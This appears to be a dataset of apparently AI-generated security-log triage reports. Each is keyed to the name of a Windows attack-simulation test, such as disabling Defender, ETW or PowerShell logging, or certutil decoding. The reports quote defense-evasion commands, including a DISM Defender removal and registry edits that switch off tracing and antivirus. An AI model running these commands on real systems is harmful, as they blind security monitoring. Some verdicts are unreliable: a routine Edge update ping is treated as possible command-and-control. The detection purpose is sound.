4. **Potential Time Manipulation:**
   - There is evidence in the security log of the system time being changed, which can be suspicious as attackers sometimes change system times to evade detection in logs. 
  
5. **Use of `whoami.exe` and `hostname.exe`:**
   - The presence of `whoami.exe` and `hostname.exe` processes might be part of regular administrative checks, but combined with other suspicious activity, could be used by an attacker to gather information about the environment under an escalated privilege context (IntegrityLevel: High).

Based on the assessment of the scenarios above, this event log indicates actions typical of initial stages of an attack, where an attacker might be altering security settings, evading detection, and gathering information about the environment. 

**Resolution: SUSPICIOUS**

**Guidance:**
- Conduct a further in-depth investigation to confirm whether these actions were authorized or part of routine administrative work. 
- Check any associated user accounts for unauthorized access or compromise.
- Review security policies in place around the use of administrative tools and registry modification. 
- Monitor for further abnormal behavior or log modifications and consider increasing log verbosity for future detection.
- Evaluate endpoint security solutions and their effectiveness in detecting such anomalies."
Disable Windows Command Line Auditing using reg.exe,"Based on the analysis of the provided event logs, here is the detailed investigation:

1. **Time Changes**:  
   - The Security and System logs highlight that the system time was altered. Two `EventID 4616` Security Events and one `Kernel-General EventID 1` show changes with svchost.exe at its core. While time changes in themselves aren't abnormal, repeated, close succession changes without a clear, legitimate purpose could indicate tampering.
   
2. **Process Executions**:  
   - There are multiple entries from Sysmon with `EventID 1` and `EventID 5` that detail processes like `wevtutil.exe` and `conhost.exe` being executed by the user ""SERVER002\\admin_test"". The presence of `wevtutil.exe` could be benign depending on context, but is worth a closer look as it can be used for log altering activities by malicious users.
   - The repeated execution of svchost.exe under SYSTEM is common.

3. **PowerShell Logs**:  
   - The absence of PowerShell logs might suggest either no activity or log tampering. Given sysadmin activities or automated tasks, one might expect some presence of PowerShell commands. This lack of logs amidst such activity warrants further technical validation.

4. **Cmd Execution with Suspicious Command Arg**:  
   - `cmd.exe` executed a command related to registry modifications (`reg add`) with privilege escalation implications, which seems unusual, especially when executed by ""SERVER002\\admin_test"". Modifying registry audit settings can be indicative of attempts to evade detection.

5. **Microsoft Edge Update Executions**:  
   - A sequence of Microsoft Edge Update related executions is present. This could be benign as a result of legitimate update checks/installations if the update process is frequent. However, if these updates are more frequent than usual, ensure checks are carried out to verify the legitimacy of these versions and processes.

### Assessment:

The presence of suspicious command-line arguments, multiple system time changes, and executions of potential admin-level processes highlight several areas of concern. While none of the activities independently confirm malicious actions conclusively, together they propose an increased risk of malicious activity or potential configuration tampering, especially concerning system time changes and registry modifications.

### Recommendation:

- **Resolution**: **SUSPICIOUS**  
These logs warrant deeper investigation to determine the legitimacy of the registry modifications and time changes. Further investigation into the context and source of these activities should be pursued to confirm if these operations align with regular system administration or are malicious in nature.

- **Steps to Proceed**:
  - Review any corresponding logs from applications or network traffic around the same timestamp to cross-check any unauthorized access or anomalous activities.
  - Verify system/application-level jobs/scripts for intended tasks involving processes like `wevtutil`, registry changes or time settings adjustments.
  - Confirm status and behavior of the Microsoft Edge Update tasks to rule out or confirm benign updates.
  - Consider enabling more detailed logging or an audit trail for escalation activities and potentially unauthorized changes.

By proceeding with these steps, you can clarify any uncertainties and either confirm a benign scenario or identify a compromised system that needs immediate attention."
Msiexec.exe - Execute Local MSI file with embedded JScript,"### Detailed Log Analysis:

Upon reviewing the provided Sysmon, Security, System, and Application logs, I focused on Sysmon logs as they contained the most pertinent data indicative of potential malicious activity:

#### Key Observations:
1. **Recurrent Execution of System Utilities:**
   - There were repeated instances of common Windows utilities such as:
     - `wevtutil.exe`
     - `hostname.exe`
     - `whoami.exe`
     - `cmd.exe`
     - `msiexec.exe`

2. **Msiexec Executing a Suspicious MSI File:**
   - `msiexec.exe` is observed executing from the CMD with a command-line argument pointing to a potentially suspicious MSI file: `data.007_JScript.msi` located in a temporary directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.007\\bin\\`).
   - Temporary directories are often used for downloading and executing malicious payloads.

3. **Execution Patterns:**
   - Command execution and utility use patterns from a temporary directory are atypical of standard user behavior.
   - The extraction and execution of the `.msi` file through a command sequence (`cmd.exe /c`) further suggests automation or scripting typical of malware operations.

4. **High Integrity Level and Admin User:**
   - All processes are executed with a high integrity level by the user `SERVER002\\admin_test`, using an administrative account. This could potentially allow malware to escalate privileges or perform sensitive operations.

5. **Sequence of Events Suggesting Malicious Activity:**
   - The events are tightly timed and suggest execution in a scripted manner, evidenced by sequential timestamps without user interaction.
   - The relationship among processes initiated by `cmd.exe`, followed by `msiexec`, further aligns with tactics often employed by adversaries to run malicious installers.

#### Guidance and Assessment:
- **Investigation of Suspicious MSI**: The `data.007_JScript.msi` should be investigated further to determine its contents and origin.
- **Review User Activity**: Investigate the `admin_test` account for anomalous behavior or unauthorized use.
- **Antivirus and Endpoint Security Check**: Ensure antivirus or endpoint security solutions are active and that their definitions are up to date given the presence of potential suspicious file operations.
- **Audit Temporary Files**: Audit the temporary directory for any additional suspicious files or residuals that may provide indicators of compromise.

### Final Resolution:
- **MALICIOUS**: The patterns observed in the logs, particularly the installation of a suspicious MSI from a temporary location without apparent user interaction, strongly indicate malicious activity. Immediate steps should be taken to isolate the system, review other connected systems for indicators of the same activity, and conduct a comprehensive forensic review to understand the full extent of the incident."
Phantom Dll Hijacking - WinAppXRT.dll,"After analyzing the provided logs, here are the main observations:

1. **MicrosoftEdgeUpdate.exe Execution:**
   - There are multiple executions of `MicrosoftEdgeUpdate.exe`. While this executable is typically related to legitimate updates for the Microsoft Edge browser, it's important to be cautious of any anomalies in its execution.
   - One execution contains suspicious command-line arguments: `""/ping PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48cmVxdWVzdCBwcm90b2NvbD0iMy4wIiB1cGRhdGVyPSJPbWFoYSIgdXBkYXRlcnZlcnNpb249IjEuMy4xOTUuMjciIHNoZWxsX3ZlcnNpb249IjEuMy4xNDcuMzciIGlzbWFjaGluZT0iMSIgc2Vzc2lvbmlkPSJ7QjA4NkQzRjQtN0U1My00MkE4LUE4NkItRjczMTMwNTAwNUZFfSIgdXNlcmlkPSJ7MDNDQTNERDItNDhDRi00Nzc5LUI4QjktMUE2RDJDRUYwRUZEfSIgaW5zdGFsbHNvdXJjZT0ic2VsZnVwZGF0ZSIgcmVxdWVzdGlkPSJ7NUFCMURBNzMtRDk3NS00OEIyLTg4NzUtQUUyOEM3MDBDMUNBfSIgZGVkdXA9ImNyIiBkb21haW5qb2luZWQ9IjAiPjxodyBsb2dpY2FsX2NwdXM9IjIiIHBoeXNtZW1vcnk9IjQiIGRpc2tfdHlwZT0iMSIgc3NlPSIxIiBzc2UyPSIxIiBzc2UzPSIxIiBzc3NlMz0iMSIgc3NlNDE9IjEiIHNzZTQyPSIxIiBhdng9IjAiLz48b3MgcGxhdGZvcm09IndpbiIgdmVyc2lvbj0iMTAuMC4xOTA0NS41MDExIiBzcD0iIiBhcmNoPSJ4NjQiIHByb2R1Y3RfdHlwZT0iMTAxIiBpc193aXA9IjAiIGlzX2luX2xvY2tkb3duX21vZGU9IjAiLz48b2VtIHByb2R1Y3RfbWFudWZhY3R1cmVyPSJpbm5vdGVrIEdtYkgiIHByb2R1Y3RfbmFtZT0iVmlydHVhbEJveCIvPjxleHAgZXRhZz0iJnF1b3Q7ZGw0eEozY0pTVE1EdW4zSmRMLzRaeEc5akpMQm5DVnYrc0xmSFY2dVNZND0mcXVvdDsiLz48YXBwIGFwcGlkPSJ7RjNDNEZFMDAtRUZENS00MDNCLTk1NjktMzk4QTIwRjFCQTRBfSIgdmVyc2lvbj0iMS4zLjE5NS4yNSIgbmV4dHZlcnNpb249IjEuMy4xOTUuMjciIGxhbmc9IiIgYnJhbmQ9IklOQlgiIGNsaWVudD0iIiBpbnN0YWxsYWdlPSIxMjIiIGluc3RhbGxkYXRldGltZT0iMTcxOTUwNDU2MSIgY29ob3J0PSJycmZAMC4xMyI-PGV2ZW50IGV2ZW50dHlwZT0iMyIgZXZlbnRyZXN1bHQ9IjEiIGVycm9yY29kZT0iMCIgZXh0cmFjb2RlMT0iMCIgc3lzdGVtX3VwdGltZV90aWNrcz0iMTYwMjkyMzY2OSIvPjwvYXBwPjwvcmVxdWVzdD4""`.
   - The named arguments and encoded data, particularly around an update ping, may suggest an unconventional update process or misuse of an application infrastructure for command and control.

2. **Usage of CMD and WHOAMI:**
   - Execution of `cmd.exe` with a command to copy and rename `amsi.dll`, and modify the registry key is a common indicator of malicious activity aimed at disabling the Antimalware Scan Interface (AMSI) to bypass detection mechanisms.
   - Multiple executions of `whoami.exe` under an elevated context could suggest attempts to ascertain user identity or context escalation during lateral movement within a network.

3. **Registry Modification via REG.EXE:**
   - The presence of `reg.exe` adding an entry under `""HKEY_CURRENT_USER\\Environment""` and the referenced environment variable modifications indicates there could be an attempt to set up persistence or launch an additional script/application without user knowledge.

4. **Repeated execution of MicrosoftEdgeUpdate:**
   - The execution patterns with temporary directory locations can suggest potential malicious download or temporary storage for further exploitation.

Given these observations, the logs demonstrate:

- **SUSPICIOUS Behavior:** Alteration of AMSI DLL, registry modification tactics to facilitate persistence, unusual use of system update tools, and usage of powerful command-line tools (cmd, whoami, reg).

**Recommendation:**

- Immediately isolate the affected host to prevent potential further actions by the attacker and explore more logs around the execution of `MicrosoftEdgeUpdate.exe` to determine the process chain before and after execution.
- Examine the changes made to AMSI DLL and Registry settings, potentially reverting or restoring them to their default state, and check related hash values against known malware signatures in threat intelligence databases.
- Conduct a full anti-malware scan and search for suspicious network activities originating from the host and IP communication using the command processor.
- Supplement with contextual analysis, including corroborating user sessions, and associate any domain/IP of interest based on intelligence data to refine assessments.
- Consider deploying advanced forensics, including memory analysis and deeper inspection of temporary folders that hosted the executable of interest."
Disable .NET Event Tracing for Windows Via Registry (cmd),"### Detailed Analysis of the Logs

The examination of the Windows event logs, particularly focusing on the Sysmon events, indicates some potentially concerning activities. Here are the key observations:

1. **Frequent Execution of System Utilities**:
   - Multiple instances of system utilities like `wevtutil.exe`, `cmd.exe`, `reg.exe`, and `whoami.exe` are executed by the `SERVER002\admin_test` user account with high integrity levels. The rapid succession of these events might suggest scripted or automated activity.
   - `wevtutil.exe` is commonly used for exporting, archiving, and clearing event logs—actions that could be part of legitimate administrative activities, yet also utilized in malicious operations to cover tracks.

2. **Registry Modification Command**:
   - There is a command-line execution of `cmd.exe` with the command `REG ADD HKLM\Software\Microsoft\.NETFramework /v ETWEnabled /t REG_DWORD /d 0`. This action alters the registry, disabling ETW (Event Tracing for Windows), which could hinder system monitoring. This change raises concern, as it can be indicative of an attempt to evade detection.

3. **Microsoft Edge Update Executions**:
   - Numerous events related to `MicrosoftEdgeUpdate.exe` and its components are significant. While normal under certain conditions, the frequency and sequence of these updates together with their executions from temporary directories could potentially be used to armor malware installations or persistence mechanisms.
   
4. **Administrative Activity**:
   - All identified suspicious executions are conducted by an `admin_test` account. An administrative account executing such a sequence of processes with elevated privileges could be symptomatic of a compromised or misused account.

### Assessment of the Situation

The detected activities, especially the registry modifications disabling ETW, suggest actions beyond normal administrative tasks. The structured sequence and use of administrative privileges point towards potential malicious attempts or at least warrant suspicion.

### Identified Threats and Risks

- **Persistence and Evasion**: Use of registry manipulation may aim for persistence or evasion of detection systems.
- **Potential Account Compromise**: The `admin_test` account is possibly exploited to execute these actions.
- **Installation of Malicious Software**: Unusual update patterns of Microsoft Edge could be leveraged for installing unintended software.

### Guidance on How to Proceed

1. **Immediately Review Privileged Accounts**: Investigate the `admin_test` account for unusual access patterns or escalation.
  
2. **Assess and Verify Registry Changes**: Check for unauthorized changes to the Windows registry, especially concerning security-sensitive keys like those related to ETW and .NET Framework settings.

3. **Conduct a Comprehensive Malware Scan**: Utilize advanced malware detection tools to scan for persistence or malware that could have been masked during these activities.

4. **Increase Monitoring and Alerts**: Set up alerts for similar activities using Sysmon and other security tools.

5. **Review Microsoft Edge Updates**: Inspect the files in the temporary directories and ensure they are not being exploited for malicious purposes.

### Resolution

Given the suspicious nature of the process executions and registry modifications, the logs should be classified as:
- **SUSPICIOUS** - The activities need further investigation to confirm whether they represent a legitimate administrative sequence or an intruding actor's strategy to facilitate malicious operations."
Windows HideSCAHealth Group Policy Feature,"Upon analyzing the provided event logs, here's a breakdown of the observed activity:

1. **Sysmon Logs**:
   - There are multiple execution events of `C:\Windows\System32\whoami.exe`, `conhost.exe`, and `wevtutil.exe` initiated by the user `SERVER002\\admin_test` with high integrity level. These are standard Windows utilities and their presence isn't inherently suspicious. However, whoami execution, typically used to confirm user access, might indicate a user confirming permissions. The use of `wevtutil.exe` is notable but might be legitimate, as it manages event logs.
   - An instance of concern is the execution of `cmd.exe` by `SERVER002\\admin_test` with a command to modify Windows Explorer policies using `reg.exe`. The command is: `cmd.exe /c reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v HideSCAHealth /t REG_DWORD /d 1 /f`. This could represent an attempt to change system behavior or hide something from the user, which might be an indicator of unauthorized activity.

2. **Application Logs**:
   - Logs show repeated instances of `edgeupdate` stopping and starting. This might suggest issues with updates or possible tampering. However, unless paired with known malicious usage, the mere stopping and starting might not be alarming.

3. **EdgeUpdate Executions**:
   - Multiple executions of `MicrosoftEdgeUpdate.exe` and related processes under `NT AUTHORITY\SYSTEM`. Though running at a system level, these are expected for updating Microsoft Edge and related components, including the installation and registration processes.

### Assessment:
- The activity logged by `NT AUTHORITY\SYSTEM` involving Microsoft Edge Update processes looks benign as these are expected background update routines.
- The command line utilization to modify Windows Explorer registry settings without clear justification, especially when executed by a high integrity level user (`SERVER002\\admin_test`), raises eyebrows. This action requires further investigation to understand the intent and context behind this modification. Changes in registry settings, especially those altering system behavior like visibility settings, could be a precursor or part of a malicious tactic.

### Resolution:
- **SUSPICIOUS**: The batch command altering registry settings is suspicious and warrants further investigation. Although it is not conclusively malicious, it could be part of a malicious play, especially if it wasn't a legitimate administrative action or scheduled task. Additional context is needed, such as user activity logs, to corroborate whether the actions align with expected user behavior or policy changes.

### Guidance on How to Proceed:
1. **Verify User Activity**: Confirm with the user `SERVER002\\admin_test` or their supervisor about any legitimate actions corresponding to the registry edit found.
2. **Review Policies**: Check if there are authorized scripts or policies that might run such processes for legitimate purposes.
3. **Consult IT Admin Logs**: Cross-reference against IT admin logs or change management records to identify if these changes were part of scheduled maintenance or updates.
4. **Enhanced Monitoring**: Implement enhanced monitoring on `Server002` to capture user activity and any further command line executions.
5. **Conduct a Security Review**: Based on findings, decide whether additional forensic analysis or remediation steps are needed."
InstallHelper method call,"After thoroughly analyzing the provided event logs, the following observations and assessments can be made:

### Observations:

1. **PowerShell Activity**: There is a suspicious PowerShell activity that involves the execution of a script named `InstallUtilTestHarness.ps1` located in a temporary directory. This script appears to invoke a .NET assembly (`data.004.dll`) through `InstallHelper`, which is indicative of potentially malicious activity. Notably, PowerShell is executed with a command that suggests an attempt to run specific functions within this assembly.

2. **Sysmon Entries**:
   - Multiple instances of `wevtutil.exe` and `conhost.exe` executions are observed. While `wevtutil.exe` can be used to query or manipulate Windows event logs, its execution several times in a short period may suggest log clearing or tampering attempt by a malicious actor.
   - The PowerShell execution leads to the creation of files in the Temp directory, often used in malicious activities to avoid detection and achieve persistence.

3. **Edge Update Processes**: Several instances of Microsoft Edge Update processes are noted. While these processes appear to function similarly to regular update procedures, there's an unusual plethora of activities captured, indicating extensive operations or possible tampering. This doesn't inherently indicate malicious activity, but combined with other activities, it might tie into a broader narrative.

### Assessment:

The collected data suggests signs of potential compromise:
- The detailed PowerShell activity involving invoking scripts from the Temp directory coupled with potential `wevtutil.exe` misuse indicates activities often associated with persistence and obfuscation tactics used by attackers. 
- The highly specific PowerShell script execution and private directory usage are red flags for potential malicious operations, often related to data exfiltration or ransomware deployment.

### Resolution:

**MALICIOUS** - The aggregate of the suspicious PowerShell script execution, combined with the Sysmon events involving `wevtutil.exe`, points towards potentially nefarious activities indicative of an intrusion or compromise attempt.

### Guidance on How to Proceed:

1. **Immediate Isolation**: Isolate the affected host (Server002) from the network to prevent lateral movement by potential attackers.
2. **Deeper Forensic Analysis**: Perform offline forensic analysis of the affected host, including memory analysis and disk analysis, to explore potential malware presence or additional malicious scripts.
3. **Log Review and Recovery**: Review security practices for logging and ensure that event logs are being collected and stored remotely to avoid manipulation. Recover and analyze event logs to track additional suspicious activities.
4. **Review Access Control**: Validate all privileged accounts for unusual activities or suspicious usage patterns.
5. **Patch Management**: Ensure the current security patches are deployed across the network, particularly focusing on any known vulnerabilities exploited through scripts or software installed on end devices.

Following these steps will help mitigate further risk and potentially identify and neutralize the root cause of the intrusion observed in the logs."
BlackByte Ransomware Registry Changes - Powershell,"### Detailed Analysis:

1. **Sysmon Logs:**
   - Observed frequent executions of `wevtutil.exe` and `conhost.exe` by user `SERVER002\admin_test`, with entries occurring nearly simultaneously. `wevtutil.exe` is a legitimate utility for managing Windows Event Logs, but frequent or unexpected execution may indicate an attempt to modify or clear logs to cover tracks.
   - Repeated executions of `HOSTNAME.EXE` and `whoami.exe` are noted. While these are legitimate system utilities, high-frequency execution might suggest their use in reconnaissance activities to gather information about the system or logged-in user.
   - A suspicious PowerShell command (`""powershell.exe"" & {New-ItemProperty ...}`) is executed. The script modifies registry entries related to system policies, which could indicate an attempt to elevate privileges or maintain persistence.

2. **Windows PowerShell Logs:**
   - The PowerShell script execution aligns with the Sysmon logs, confirming the modification of registry keys. This scripted action is directly tied to potential policy changes that could relax security measures, raising suspicion of unauthorized access or modification.

3. **Security Logs:**
   - No direct indications of login failures or privilege escalation attempts are observed in the provided logs. Timing changes and svchost.exe activities appear normal and do not directly suggest tampering.

4. **System Logs:**
   - Time synchronization changes seen here (`EventID 35`) with legitimate NTP server connections suggest expected background activity.

5. **Application Logs:**
   - Logs indicate routine activities like the Software Protection Platform execution. Nothing anomalous is detected here that intersects with potential malicious activities.

### Assessment:
The logs capture multiple anomalous activities particularly focused on the behavior surrounding the PowerShell execution. The action of altering registry keys through PowerShell, especially those influencing system policies like `LocalAccountTokenFilterPolicy` and `EnableLinkedConnections`, is typically linked with administrative control efforts, such as bypassing User Account Control (UAC) prompts and ensuring persistent access.

### Resolution:
**SUSPICIOUS**

Given the details above, the execution of the PowerShell script modifying security-related registry settings by an administrative user is notably suspicious. Further investigation is warranted to confirm the legitimacy of these actions. Investigation steps should include:

- **Verify the source of the PowerShell script**: Check logs or user activities leading to the script execution.
- **Review access logs**: Correlate activities with recent logins/access attempts by `SERVER002\admin_test`.
- **Endpoint inspection**: Conduct a thorough examination of the `Server002` host for potential indicators of compromise or unauthorized modifications.
- **Monitor for persistence mechanisms**: Investigate similar registry or policy changes for signs of persistence on the system.

Blocking or closely monitoring this account's activities until the investigation is concluded may prevent potential system compromise."
Disable Windows Defender with DISM,"Upon reviewing the provided Windows event logs, several events stand out that may potentially indicate suspicious or anomalous behavior. Let's break these findings down:

1. **Time Manipulation**:
   - Multiple events indicate that the system time was manually altered. This is evidenced by the combination of events from the System and Security logs, particularly Event ID 1 from Kernel-General and Event ID 4616 from Security-Auditing. Changing the system time can be used to cover tracks in logs and is generally suspicious if not expected.
   - The logs show the time initially set to 2024-10-28 09:06:18 but was rolled back to 2024-10-28 09:06:15. This action was performed by the `svchost.exe` process, which is often associated with legitimate Windows services but can be misused.

2. **DISM Commands**:
   - In the Sysmon logs, we see the execution of `cmd.exe` with DISM commands to disable and remove Windows Defender (`Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet`). This is highly suspicious as it indicates an attempt to disable the antivirus system, possibly to ensure the persistence of malicious activity or prevent detection.

3. **Repeated Use of System Utilities**:
   - The repeated execution of Windows utilities like `wevtutil.exe`, `whoami.exe`, and `hostname.exe` under privilege escalation can be suspicious. These utilities are typically used for system management and diagnostics, but when used in close succession or in combination with other suspicious activities, they can indicate a reconnaissance effort or privilege escalation attempt by an attacker.
   
4. **Highly Privileged Account Usage**:
   - Different events show elevated privileges granted to the `admin_test` user account, as indicated by Event ID 4672 from the Security logs. The extensive list of privileges (including `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`) implies a potentially alarming level of access.

5. **Microsoft Edge Update Anomalies**:
   - There are consistent logs regarding the execution of Microsoft Edge Update executables. While updating software is normal, their processes are happening in quick succession and may indicate either a legitimate update or an attempt to masquerade as a legitimate process.

**Assessment of the Situation**:
Given the rollback of system time, the disabling of Windows Defender, and high-level privileges being manipulated, there are strong indicators of suspicious activity that could suggest unauthorized or malicious intentions. Although not all logs conclusively prove malicious intent, the combination of these factors warrants concern.

**Resolution**: **SUSPICIOUS**

**Guidance on How to Proceed**:
- Conduct a comprehensive forensic examination on the system to identify any potential indicators of compromise beyond what is observed in the logs.
- Review user access logs and any external connections made during the given timeframe.
- Ensure that system integrity checks are conducted, specifically focusing on the travel path of the DISM and system utility commands.
- Restore system time if it was altered and cross-examine timestamps with other logs from different systems or services in your network.
- Consider isolating the affected host until the investigation concludes and all security measures have been verified and reinforced.
- Verify whether the usage of administrative privileges and system shock is consistent with legitimate administrative tasks or indicative of an intrusion."
Dynamic C# Compile,"Upon reviewing the provided Windows Event Logs, the following analysis is made:

### Suspicious Findings:

1. **PowerShell Invocation with Suspicious Command Line**:
   - Multiple instances of PowerShell being executed with an `Invoke-Expression` command: 
     - `""powershell.exe"" & {Invoke-Expression \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.004\\bin\\data.004_DynamicCompile.exe\""}`
   - The execution of scripts from the temporary directory (`AppData\\Local\\Temp`) can be a strong indication of malicious activity, often associated with malware because it's a common directory used by attackers to execute arbitrary binaries or scripts.
   
2. **Frequent Creation of Processes**:
   - The logs show frequent execution of `conhost.exe`, `wevtutil.exe`, and `whoami.exe`. While, on their own, these might not indicate malicious activity, their usage in conjunction with the PowerShell activity could suggest an attempt to mask more suspicious actions or to gather information about the environment.
   
### Benign Findings:

1. **Windows Updates and Other Legitimate Processes**:
   - There are legitimate processes related to Windows Update and antivirus updates:
     - `wuauclt.exe` running to handle update deployments and anti-malware definitions being updated through `AM_Delta.exe` and `MpSigStub.exe`.
   - `Microsoft Edge` Installer logs showing update activities for Microsoft Edge.

2. **Host Executables**:
   - Execution of `hostname.exe` and `taskhostw.exe` appear to be routine administrative activities with no clear signs of malicious intent.

### Assessment:

Given the evidence, particularly the suspicious PowerShell activity, the logs indicate potential malicious activity. The execution of a binary from a temporary directory through PowerShell suggests that further investigation is warranted to ascertain the intent and existence of any potential threats. This is a common foothold method before executing more damaging payloads, implying possible unauthorized access or malware deployment.

### Resolution:
- **SUSPICIOUS** - The logs contain activities that do not look right and need further investigation, especially around the PowerShell usage and the executable invoked from the temporary directory.

### Guidance:

1. **Immediate Actions**:
   - Investigate the `data.004_DynamicCompile.exe` binary by obtaining its hash and examining it with any available threat intelligence or sandbox analysis.
   - Check for any unusual changes in user account permissions, particularly `SERVER002\admin_test`.
   - Conduct a full scan of the system using an updated anti-malware solution.

2. **Monitoring and Investigation**:
   - Tighten the logging and monitoring of PowerShell activities.
   - Review recent user and system activity for any anomalies.
   - Verify the integrity and origin of the scripts or binaries found in the `Temp` directory.

3. **Remediation**:
   - If malicious intent is confirmed, consider isolating the affected system to prevent further propagation.
   - Change credentials and ensure multifactor authentication is enabled for any administrative access.

Proceed with caution and gather as much information as possible to fully understand the scope of the activity before taking corrective actions."
Certutil Rename and Decode,"Upon analyzing the provided logs, several points require attention:

1. **Command-Line Operations (Sysmon log)**:
   - There is an event indicating the use of a command-line operation involving `cmd.exe` that includes `certutil.exe` for encoding and decoding operations. Specifically, the command copies `certutil.exe` to a temporary file and uses it to encode and decode `calc.exe`. This sequence can be indicative of malicious activity, as `certutil.exe` is often used by attackers for downloading and encoding malicious payloads.

2. **Application Log**:
   - The application logs show normal activities related to security products and the Software Protection Platform Service, which do not raise concerns.

3. **Security Log**:
   - The logon events and privilege assignments seem routine for a SYSTEM account with expected privileges (SeAssignPrimaryTokenPrivilege, SeTcbPrivilege, SeDebugPrivilege, etc.). However, it is essential to contextualize these privileges with other activities if any anomaly arises.

4. **System Log**:
   - The system log does not show any unusual activity outside of the normal system operations, such as time synchronization and kernel updates.

5. **Sysmon Log**:
   - Multiple executions of `wevtutil.exe` and `conhost.exe` are logged under the user `admin_test`. While usage of these tools is normal, repetitive execution by an administrator account around the same time as other suspicious activities can warrant further investigation.
   - The command-line involving `cmd.exe`, `certutil.exe`, and `calc.exe` decoding and encoding operations stands out significantly as suspicious.

### Assessment

Based on the analysis above, the most pressing concern is the usage of `cmd.exe` and `certutil.exe` for what appears to be manipulating executables (specifically `calc.exe`). This behavior is not typically associated with benign activities and could indicate an attempt to obfuscate or deliver a payload.

### Resolution: **SUSPICIOUS**

The execution of `certutil.exe` in this context is a known TTP (Tactics, Techniques, and Procedures) for malicious activities. Hence, this requires further investigation. 

### Recommended Actions

- **Investigate User Activity**: Examine the `admin_test` user's activity for other irregularities or unauthorized actions around the log times.
- **Analyze Encoded Files**: Locate and analyze the temporary files (`tcm.tmp`, `data_calc2.txt`, and `data_calc2_decoded.exe`) for any signs of malicious payloads.
- **Network Analysis**: Check for any unusual outbound connections during the timeframe of these events for potential exfiltration attempts.
- **Review Related Accounts**: Ensure no other accounts show similar patterns of behavior.
- **Conduct a Malware Scan**: Execute a comprehensive antivirus scan on the host to ensure no malicious files are residing undetected.

Continue monitoring the logs for further indications of malicious intent or actions that could confirm a compromise."
Windows Powershell Logging Disabled,"Upon reviewing the provided Windows event logs, here’s a detailed analysis of any suspicious or anomalous behavior:

### Suspicious or Anomalous Behavior:
1. **Repeated Use of `wevtutil.exe`:** There are multiple instances of the `wevtutil.exe` process being executed. This utility is typically used to manage Windows Event Logs. Its repeated execution could potentially indicate someone attempting to clear logs or export them for scrutiny, which can be a sign of malicious activity.
   - Example Entries:
     - `C:\\Windows\\System32\\wevtutil.exe` by user `SERVER002\\admin_test`.

2. **Registry Modifications via Command Prompt (cmd.exe):** The logs show a command involving the disabling of PowerShell logging features, which is concerning as it can be indicative of an attempt to evade detection by security monitoring tools.
   - Command: 
     - `""cmd.exe"" /c reg  add ... & reg delete ...`
   - This suggests disabling or deleting registry keys related to PowerShell module logging, script block logging, and transcription, which are typically used to record PowerShell activity and can be used forensically to trace actions.

3. **Activity from `wsmprovhost.exe`:** This process executed both `whoami.exe` and `HOSTNAME.EXE`. While this may be part of legitimate administrative activities, in conjunction with other behaviors (like registry manipulation), it could hint at suspicious actions, especially if abused for remote management.

4. **Microsoft Edge Update Activity:** Although most Microsoft Edge update activities seem benign, ensuring their processes and paths are legitimate would be prudent. There are several Microsoft Edge-related processes, but they appear to follow regular update procedures.

5. **Event Time Change:** The security log records an event (`EventID 4616`) indicating a system time change. This could potentially disrupt log timelines and could be used to obscure malicious actions.

### Assessment:
- **Processes and Activities:**
  - The combination of disabling PowerShell logging features and potential log management through `wevtutil.exe` is a concerning pattern.
  - Command-line activities that disable security features are generally considered suspicious, especially in a production environment.

### Final Resolution:
- **SUSPICIOUS**: The activity within these logs is suspicious. While some elements like the Microsoft Edge update and `conhost.exe` use could be benign, the disabling of PowerShell logging and repeated use of `wevtutil.exe` warrant further investigation to rule out potential malicious activities. It's advisable to verify the legitimacy of these actions and, if needed, conduct a comprehensive review of the user's activities (`SERVER002\\admin_test`), along with ensuring recovery and security monitoring features remain active.

### Next Steps:
- **Review User Actions:** Confirm if `SERVER002\\admin_test` was conducting legitimate administrative tasks.
- **Inspect System Time Setting Changes:** Investigate the reason behind any changes to the system's time, especially within proximity to other suspicious activities.
- **Enhance Monitoring and Logging:** Ensure logging of such activities is enabled and monitored in real-time to detect similar patterns in the future.
- **Conduct Threat Hunting:** Initiate a deeper investigation into other irregularities on the host system, checking for other signs of compromise or attempted cover-ups."
Tamper with Windows Defender Registry,"### Detailed Analysis of Logs

Upon reviewing the logs provided, there are several events that may standout in terms of potentially suspicious activity:

1. **Sysmon Logs: Use of `wevtutil.exe` and `conhost.exe`:**
   - Multiple executions of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test`. While `wevtutil.exe` can be used legitimately for event log management, its usage without clear context or frequent execution can be suspicious, as it might be used to clear event logs to cover malicious activity.
   - `conhost.exe` is a legitimate Windows process associated with the console window host, but frequent execution in tandem with other suspicious processes suggests monitoring or tampering with the command line interface.

2. **Sysmon Logs: Execution of `powershell.exe` for Disabling Windows Defender:**
   - The event logs clearly show a PowerShell command executed to disable Windows Defender with: `Set-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"" -Name DisableAntiSpyware -Value 1`.
   - Disabling antivirus solutions like Windows Defender is a common tactic used by malware to avoid detection. This is a high indicator of potentially malicious behavior.

3. **PowerShell Logs: Execution Consistency:**
   - PowerShell logs provide consistent data with the Sysmon log, showing an explicit command execution aimed at disabling Windows Defender, which is concerning.

4. **Sysmon Logs: Edge Update Processes:**
   - A significant number of process creations associated with the Microsoft Edge Update mechanism. While frequent updates can be normal, the sheer volume and nested nature (`updatesetup.exe`, `setup.exe`) may warrant a closer look to ensure legitimacy. However, given the context, it aligns with normal operations if Edge had a scheduled update.

### Assessment

- **Suspicious Activity Detected:** The presence of a PowerShell command intended to disable Windows Defender is of particular concern. This action indicates an attempt to reduce system defenses, which is a common preparatory step in many types of attacks, including malware deployment.

### Resolution

**SUSPICIOUS**

- **Guidance on How to Proceed:**
  1. **Immediate Monitoring:** Begin closely monitoring SERVER002 for any further suspicious activity. Specifically, watch for any additional attempts to disable or interfere with security software.
  2. **Historical Review:** Check historical logs for previous instances of similar behavior to determine if this is an isolated incident or part of a broader compromise.
  3. **Endpoint Security Check:** Verify the status and integrity of Windows Defender and other security solutions on SERVER002.
  4. **Investigate User Activity:** Conduct a thorough investigation into the user account `SERVER002\admin_test` involved in initiating these actions. Determine if the account may have been compromised.
  5. **Alert Incident Response:** Depending on the company's security protocol, inform the incident response team to initiate predefined actions for potential compromise scenarios.

